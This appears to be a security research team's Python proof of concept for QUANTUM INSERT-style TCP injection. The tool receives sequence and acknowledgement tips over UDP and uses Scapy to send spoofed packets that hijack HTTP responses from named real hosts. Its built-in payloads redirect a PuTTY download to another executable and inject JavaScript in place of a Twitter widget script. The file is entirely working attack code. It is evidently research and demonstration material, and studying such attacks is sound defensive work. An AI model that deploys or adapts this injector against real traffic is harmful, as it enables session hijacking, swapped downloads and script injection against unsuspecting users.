#!/usr/bin/env python
#
# file:     shooter.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# shooter.py, used to receive TCP seq+ack data and sending spoofed packet
#

# Python imports
import sys
import struct
import socket
import argparse

# Scapy imports
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, conf

# Local imports
from monitor import QuantumTip, TIP_LEN, TIP_STRUCT

# Example QI payloads
PAYLOAD_BANG = "BANG! BANG! BANG! BANG! BANG! BANG!\r\n" * 8
PAYLOAD_FOX = "HTTP/1.1 302 Found\r\nLocation: http://fox-it.com/\r\nContent-Length: 0\r\n\r\n"
PAYLOAD_7ZIP = "HTTP/1.1 302 Found\r\nLocation: http://www.7-zip.org/a/7z938.exe\r\nContent-Length: 0\r\n\r\n"

XSS = 'alert("QUANTUM INSERT!");'
# XSS = 'alert("QUANTUM DPIC!"); window.onload = function(){$("img").attr("src", "http://i.imgur.com/CE4r5vR.jpg");};'
PAYLOAD_XSS = 'HTTP/1.1 200 OK\r\nContent-Type: text/javascript\r\nConnection: close\r\nContent-Length: ' + str(len(XSS)) + "\r\n\r\n" + XSS


class QI(object):
    sock = None

    def __init__(self, selectors):
        self.selectors = selectors
        self.sock = conf.L3socket()

    def inject(self, src, dst, sport, dport, seq, ack):
        payload = self.selectors.get(src, PAYLOAD_BANG)
        p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq+1, ack=ack, flags="PA") / payload
        self.sock.send(p)
        print 'Shooting: %r' % p


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-l", "--listen", default="0.0.0.0",
                        help="listen on specified ip")
    parser.add_argument("-p", "--port", type=int, default=1111,
                        help="listen on specified (udp) port")

    args = parser.parse_args()

    qi = QI({
        "96.126.98.124": PAYLOAD_BANG,  # www.jsonip.com
        "91.225.248.129": PAYLOAD_FOX,  # www.linkedin.com
        "216.34.181.45": PAYLOAD_FOX,   # slashdot.org
        "46.43.34.31": PAYLOAD_7ZIP,    # http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
        "199.96.57.6": PAYLOAD_XSS,     # http://platform.twitter.com/widgets.js (loaded by imgur.com)
    })

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.listen, args.port))

    print 'Shooter listening on %s:%u' % (args.listen, args.port)

    while True:
        data, addr = sock.recvfrom(1024)
        if len(data) == TIP_LEN:
            tip = QuantumTip._make(struct.unpack(TIP_STRUCT, data))
            print 'Received tip from %r: %r' % (addr, tip)
            qi.inject(
                src=socket.inet_ntoa(struct.pack(">I", tip.src)),
                dst=socket.inet_ntoa(struct.pack(">I", tip.dst)),
                sport=tip.sport,
                dport=tip.dport,
                seq=tip.seq,
                ack=tip.ack,
            )

if __name__ == '__main__':
    sys.exit(main())
